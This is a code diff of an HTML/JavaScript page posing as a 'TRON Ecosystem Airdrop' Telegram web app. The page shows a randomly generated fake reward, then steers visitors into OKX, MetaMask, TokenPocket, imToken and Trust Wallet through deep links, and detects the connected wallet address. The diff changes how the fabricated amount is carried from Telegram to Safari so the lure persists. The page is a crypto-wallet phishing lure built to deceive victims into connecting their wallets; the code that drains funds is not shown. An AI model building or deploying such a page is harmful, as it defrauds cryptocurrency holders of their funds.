@@ -10,17 +10,14 @@
         :root { --primary: #007aff; --bg: #000; --card: #1c1c1e; --text: #fff; --gold: #ffcc00; }
         body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         
-        /* 基础容器 */
         #ui-external { text-align: center; display: none; flex-direction: column; align-items: center; width: 100%; }
         .airdrop-container { padding: 20px; display: flex; flex-direction: column; align-items: center; width: 100%; }
 
-        /* 标题与动态点 */
         .main-title { font-size: 22px; margin: 10px 0 30px; letter-spacing: -0.5px; }
         .live-indicator { font-size: 11px; color: #34c759; font-weight: bold; display: flex; align-items: center; gap: 6px; }
         .dot { width: 8px; height: 8px; background: #34c759; border-radius: 50%; box-shadow: 0 0 10px #34c759; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        /* 空投卡片 */
         .airdrop-card {
             background: linear-gradient(160deg, #1e293b 0%, #0f172a 100%);
             border: 1px solid rgba(255,255,255,0.1); border-radius: 32px;
@@ -32,50 +29,30 @@
         .amount-display .currency { font-size: 24px; color: #64748b; vertical-align: top; }
         .amount-display .value { font-size: 48px; font-weight: 800; color: #fff; }
 
-        /* 进度条 */
-        .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; margin-bottom: 8px; }
         .progress-container { height: 8px; background: #334155; border-radius: 4px; overflow: hidden; margin-bottom: 25px; }
         .progress-bar { width: 92%; height: 100%; background: linear-gradient(90deg, var(--primary), #60a5fa); box-shadow: 0 0 15px rgba(0,122,255,0.4); }
 
-        /* 按钮 */
-        .btn-main { 
-            width: 100%; padding: 18px 0; background: #fff; color: #000; 
-            border: none; border-radius: 18px; font-size: 16px; font-weight: 700; 
-            cursor: pointer; transition: transform 0.2s; 
-        }
+        .btn-main { width: 100%; padding: 18px 0; background: #fff; color: #000; border: none; border-radius: 18px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; }
         .btn-main:active { transform: scale(0.95); }
-        .security-note { font-size: 11px; color: #475569; margin-top: 15px; }
 
-        /* 降落动画遮罩 */
-        .anim-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center;
-            z-index: 3000;
-        }
+        .anim-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 3000; }
         .box-container { animation: dropDown 2.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; }
         .parachute { font-size: 80px; text-align: center; line-height: 1; }
         .crate { font-size: 60px; margin-top: -20px; text-align: center; }
         @keyframes dropDown {
             0% { transform: translateY(-120vh) scale(0.5); }
-            70% { transform: translateY(15vh) scale(1.1); }
             100% { transform: translateY(0) scale(1); }
         }
 
-        /* 弹窗通用 */
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); display: none; align-items: center; justify-content: center; z-index: 1000; }
         .overlay.active { display: flex; }
         .modal { background: var(--card); width: 88%; max-width: 350px; border-radius: 28px; padding: 24px; border: 1px solid #333; }
-        
-        /* 结果弹窗 */
         .result-modal { text-align: center; border: 2px solid var(--gold); }
         .win-amount-box { margin: 20px 0; padding: 15px; background: rgba(255,204,0,0.1); border-radius: 12px; border: 1px dashed var(--gold); }
-        #won-amount { font-size: 40px; font-weight: 800; color: #fff; }
-
-        /* 钱包列表 */
-        .wallet-option { display: flex; align-items: center; padding: 12px 16px; background: #2c2c2e; border-radius: 16px; cursor: pointer; margin-bottom: 10px; }
-        .wallet-logo { width: 40px; height: 40px; border-radius: 10px; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; flex-shrink: 0; }
         
-        /* 内部连接成功 */
+        .wallet-option { display: flex; align-items: center; padding: 12px 16px; background: #2c2c2e; border-radius: 16px; cursor: pointer; margin-bottom: 10px; }
+        .wallet-logo { width: 40px; height: 40px; border-radius: 10px; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; }
+        
         #ui-internal { display: none; text-align: center; }
         .address-text { font-family: monospace; color: #888; font-size: 12px; background: #000; padding: 10px; border-radius: 8px; word-break: break-all; margin-top: 10px; }
     </style>
@@ -86,36 +63,26 @@
         <div class="airdrop-container">
             <div class="live-indicator"><span class="dot"></span> LIVE DISTRIBUTION</div>
             <h1 class="main-title">TRON Ecosystem Airdrop</h1>
-
             <div class="airdrop-card">
-                <div class="reward-tag">ESTIMATED REWARD</div>
+                <div class="reward-tag">UNCLAIMED REWARD</div>
                 <div class="amount-display">
                     <span class="currency">$</span><span class="value">0.00</span>
                 </div>
-                <div class="progress-info"><span>Pool Status</span><span>92%</span></div>
                 <div class="progress-container"><div class="progress-bar"></div></div>
-                
                 <button class="btn-main claim-btn" onclick="startClaimFlow()">CLAIM NOW</button>
-                <div class="security-note">🔒 Verification via Telegram...</div>
+                <div style="font-size:11px; color:#475569; margin-top:15px;">🔒 Verified Airdrop Protocol</div>
             </div>
         </div>
     </div>
 
     <div id="airdrop-anim-overlay" class="anim-overlay">
-        <div class="box-container">
-            <div class="parachute">🪂</div>
-            <div class="crate">🎁</div>
-        </div>
+        <div class="box-container"><div class="parachute">🪂</div><div class="crate">🎁</div></div>
     </div>
 
     <div id="result-popup" class="overlay">
         <div class="modal result-modal">
-            <div style="font-size: 50px;">🎊</div>
-            <h2 style="margin: 10px 0;">Success!</h2>
-            <div class="win-amount-box">
-                <span style="color:var(--gold); font-weight:bold;">$</span>
-                <span id="won-amount">0.00</span>
-            </div>
+            <div style="font-size:50px;">🎊</div>
+            <div class="win-amount-box"><span style="color:var(--gold);">$</span><span id="won-amount" style="font-size:40px; font-weight:800;">0.00</span></div>
             <button class="btn-main" style="background:var(--gold)" onclick="closeResult()">AWESOME!</button>
         </div>
     </div>
@@ -123,14 +90,11 @@
     <div id="walletModal" class="overlay">
         <div class="modal">
             <h3 style="text-align:center; margin-top:0;">Select Wallet</h3>
-            <div class="wallet-list">
-                <div class="wallet-option" onclick="jumpTo('okx')"><div class="wallet-logo" style="background:#fff">OKX</div><b>OKX Wallet</b></div>
-                <div class="wallet-option" onclick="jumpTo('tp')"><div class="wallet-logo" style="background:#2161ff; color:#fff">TP</div><b>TokenPocket</b></div>
-                <div class="wallet-option" onclick="jumpTo('mm')"><div class="wallet-logo" style="background:#f6851b; color:#fff">MM</div><b>MetaMask</b></div>
-                <div class="wallet-option" onclick="jumpTo('im')"><div class="wallet-logo" style="background:#098de6; color:#fff">IM</div><b>imToken</b></div>
-                <div class="wallet-option" onclick="jumpTo('trust')"><div class="wallet-logo" style="background:#3375bb; color:#fff">TW</div><b>Trust Wallet</b></div>
-                <div class="wallet-option" onclick="jumpTo('bitget')"><div class="wallet-logo" style="background:#00f0ff; color:#000">BG</div><b>Bitget Wallet</b></div>
-            </div>
+            <div class="wallet-option" onclick="jumpTo('okx')"><div class="wallet-logo" style="background:#fff">OKX</div><b>OKX Wallet</b></div>
+            <div class="wallet-option" onclick="jumpTo('tp')"><div class="wallet-logo" style="background:#2161ff; color:#fff">TP</div><b>TokenPocket</b></div>
+            <div class="wallet-option" onclick="jumpTo('mm')"><div class="wallet-logo" style="background:#f6851b; color:#fff">MM</div><b>MetaMask</b></div>
+            <div class="wallet-option" onclick="jumpTo('im')"><div class="wallet-logo" style="background:#098de6; color:#fff">IM</div><b>imToken</b></div>
+            <div class="wallet-option" onclick="jumpTo('trust')"><div class="wallet-logo" style="background:#3375bb; color:#fff">TW</div><b>Trust Wallet</b></div>
             <div style="text-align:center; color:#ff453a; margin-top:15px; cursor:pointer;" onclick="closeModal()">Cancel</div>
         </div>
     </div>
@@ -145,115 +109,96 @@
     </div>
 
     <script>
-    const tg = window.Telegram.WebApp;
-    const currentUrl = window.location.href.split('?')[0];
-    let userBalance = 0;
+        const tg = window.Telegram.WebApp;
+        const currentUrl = window.location.href.split('?')[0];
+        let userBalance = 0;
 
-    // --- 核心逻辑：持久化存储 ---
-    
-    // 1. 启动流程
-    function startClaimFlow() {
-        const btn = document.querySelector('.claim-btn');
-        btn.innerText = "VERIFYING...";
-        btn.disabled = true;
+        function startClaimFlow() {
+            const btn = document.querySelector('.claim-btn');
+            btn.innerText = "VERIFYING...";
+            btn.disabled = true;
+            setTimeout(() => {
+                document.getElementById('airdrop-anim-overlay').style.display = 'flex';
+                userBalance = (Math.random() * (1000 - 20) + 20).toFixed(2);
+                localStorage.setItem('airdrop_balance', userBalance);
+                setTimeout(showResult, 2500);
+            }, 800);
+        }
 
-        setTimeout(() => {
-            // 播放动画
-            document.getElementById('airdrop-anim-overlay').style.display = 'flex';
-            
-            // 生成随机金额
-            userBalance = (Math.random() * (1000 - 20) + 20).toFixed(2);
-            
-            // 【关键】将金额和状态存入本地存储
-            localStorage.setItem('airdrop_balance', userBalance);
-            localStorage.setItem('airdrop_step', 'claimed');
+        function showResult() {
+            document.getElementById('airdrop-anim-overlay').style.display = 'none';
+            document.getElementById('result-popup').classList.add('active');
+            document.getElementById('won-amount').innerText = userBalance;
+        }
 
-            setTimeout(showResult, 2500);
-        }, 800);
-    }
+        function closeResult() {
+            document.getElementById('result-popup').classList.remove('active');
+            refreshUI();
+        }
 
-    function showResult() {
-        document.getElementById('airdrop-anim-overlay').style.display = 'none';
-        document.getElementById('result-popup').classList.add('active');
-        document.getElementById('won-amount').innerText = userBalance;
-    }
+        function refreshUI() {
+            document.querySelector('.amount-display .value').innerText = userBalance;
+            const btn = document.querySelector('.claim-btn');
+            btn.innerText = "WITHDRAW TO WALLET";
+            btn.style.background = "#ffcc00";
+            btn.disabled = false;
+            btn.onclick = startConnect;
+        }
 
-    function closeResult() {
-        document.getElementById('result-popup').classList.remove('active');
-        refreshUIWithBalance();
-    }
-
-    // 更新界面为“已领取”状态的函数
-    function refreshUIWithBalance() {
-        document.querySelector('.amount-display .value').innerText = userBalance;
-        const btn = document.querySelector('.claim-btn');
-        btn.innerText = "WITHDRAW TO WALLET";
-        btn.style.background = "#ffcc00";
-        btn.disabled = false;
-        btn.onclick = startConnect; 
-    }
-
-    // 2. 环境检测与状态恢复
-    async function checkEnv() {
-        await new Promise(r => setTimeout(r, 600));
-        
-        // 【核心】从本地存储恢复状态
-        const savedBalance = localStorage.getItem('airdrop_balance');
-        const savedStep = localStorage.getItem('airdrop_step');
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const isSafariMode = urlParams.get('os') === 'safari';
-
-        const isWallet = (window.tronWeb && window.tronWeb.defaultAddress.base58) || window.ethereum;
-
-        if (isWallet) {
-            document.getElementById('ui-internal').style.display = 'block';
-            if(window.tronWeb) document.getElementById('addr').innerText = window.tronWeb.defaultAddress.base58;
-        } else {
-            document.getElementById('ui-external').style.display = 'flex';
-
-            // 如果本地已经有余额了，直接展示，不让重抽
-            if (savedBalance && savedStep === 'claimed') {
-                userBalance = savedBalance;
-                refreshUIWithBalance();
-                
-                // 如果是在 Safari 跳转模式，自动弹窗
-                if (isSafariMode) openModal();
+        function startConnect() {
+            // 核心：必须把金额带在 URL 里传给 Safari
+            const nextUrl = currentUrl + `?os=safari&amount=${userBalance}`;
+            if (tg.platform !== "unknown" && !window.location.search.includes('os=safari')) {
+                tg.openLink(nextUrl, { try_browser: true });
+            } else {
+                openModal();
             }
         }
-    }
 
-    // 3. 跳转逻辑
-    function startConnect() {
-        const nextUrl = currentUrl + `?os=safari`; // 不再需要把金额放 URL 里，因为 localStorage 能跨页面读取（同域名下）
-        
-        if (tg.platform !== "unknown" && !window.location.search.includes('os=safari')) {
-            tg.openLink(nextUrl, { try_browser: true });
-        } else {
-            openModal();
+        async function checkEnv() {
+            await new Promise(r => setTimeout(r, 600));
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlAmount = urlParams.get('amount'); // 检查 URL 里的金额
+            const localAmount = localStorage.getItem('airdrop_balance'); // 检查本地存储
+
+            const isWallet = (window.tronWeb && window.tronWeb.defaultAddress.base58) || window.ethereum;
+
+            if (isWallet) {
+                document.getElementById('ui-internal').style.display = 'block';
+                if(window.tronWeb) document.getElementById('addr').innerText = window.tronWeb.defaultAddress.base58;
+            } else {
+                document.getElementById('ui-external').style.display = 'flex';
+
+                // 核心逻辑：判定是否直接进入“提现模式”
+                if (urlAmount || localAmount) {
+                    userBalance = urlAmount || localAmount;
+                    refreshUI();
+                    // 如果 URL 里有 amount，说明是从 TG 跳过来的 Safari，自动弹窗
+                    if (urlAmount && window.location.search.includes('os=safari')) {
+                        openModal();
+                    }
+                }
+            }
         }
-    }
 
-    // --- 弹窗与跳转逻辑保持不变 ---
-    function openModal() { document.getElementById('walletModal').classList.add('active'); }
-    function closeModal() { document.getElementById('walletModal').classList.remove('active'); }
+        function openModal() { document.getElementById('walletModal').classList.add('active'); }
+        function closeModal() { document.getElementById('walletModal').classList.remove('active'); }
 
-    function jumpTo(type) {
-        let scheme = "";
-        const fullUrl = window.location.href;
-        const encodedUrl = encodeURIComponent(fullUrl);
-        switch(type) {
-            case 'okx': scheme = "okx://wallet/dapp/details?dappUrl=" + encodedUrl; break;
-            case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": fullUrl})); break;
-            case 'mm': scheme = "https://metamask.app.link/dapp/" + fullUrl.replace("https://", ""); break;
-            case 'im': scheme = "imtokenv2://navigate?screen=DappView&url=" + encodedUrl; break;
-            case 'trust': scheme = "trust://dl?url=" + encodedUrl; break;
-            case 'bitget': scheme = "bitkeep://bkconnect?url=" + encodedUrl; break;
+        function jumpTo(type) {
+            let scheme = "";
+            const jumpUrl = window.location.href;
+            const encodedUrl = encodeURIComponent(jumpUrl);
+            switch(type) {
+                case 'okx': scheme = "okx://wallet/dapp/details?dappUrl=" + encodedUrl; break;
+                case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": jumpUrl})); break;
+                case 'mm': scheme = "https://metamask.app.link/dapp/" + jumpUrl.replace("https://", ""); break;
+                case 'im': scheme = "imtokenv2://navigate?screen=DappView&url=" + encodedUrl; break;
+                case 'trust': scheme = "trust://dl?url=" + encodedUrl; break;
+            }
+            if (scheme) window.location.href = scheme;
         }
-        if (scheme) window.location.href = scheme;
-    }
 
-    window.onload = checkEnv;
-</script>
+        window.onload = checkEnv;
+    </script>
 </body>
 </html>
